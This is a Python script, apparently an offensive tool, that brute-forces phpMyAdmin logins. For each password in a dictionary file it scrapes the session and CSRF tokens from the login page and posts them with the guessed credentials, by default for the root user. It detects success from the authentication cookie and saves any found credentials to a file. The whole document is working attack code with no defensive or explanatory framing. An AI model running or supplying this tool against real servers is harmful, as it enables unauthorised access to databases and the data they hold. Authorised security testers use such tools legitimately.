#!/usr/bin/env python3
import requests
import html
import re
import os
import argparse


def login(url, username, password):
	for i in range(3):
		try:
			res = requests.get(url)
			cookies = dict(res.cookies)
			data = {
				'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'pma_username': username,
				'pma_password': password,
			}
			res = requests.post(url, cookies=cookies, data=data)
			cookies = dict(res.cookies)
			return 'pmaAuth-1' in cookies
		except:
			pass
	return False

def main():
	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')
	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
	parser.add_argument('-dict', default='password.txt', help='The file path of password dictionary (default: password.txt)')

	args = parser.parse_args()
	url = args.url
	username = args.user
	dictionary = args.dict

	if url is None:
		parser.print_help()
		return

	try:
		f = open(dictionary, "r")
		passwords = f.read().split()
		f.close()
	except:
		print("[-] Failed to read '%s' file." % (dictionary))
		return

	for password in passwords:
		if login(url, username, password):
			print("[*] FOUND - %s / %s" % (username, password))

			f = open("found.txt", "w")
			f.write("%s / %s\n" % (username, password))
			f.close()
		else:
			print("[!] FAILED - %s / %s" % (username, password))

if __name__ == '__main__':
	main()
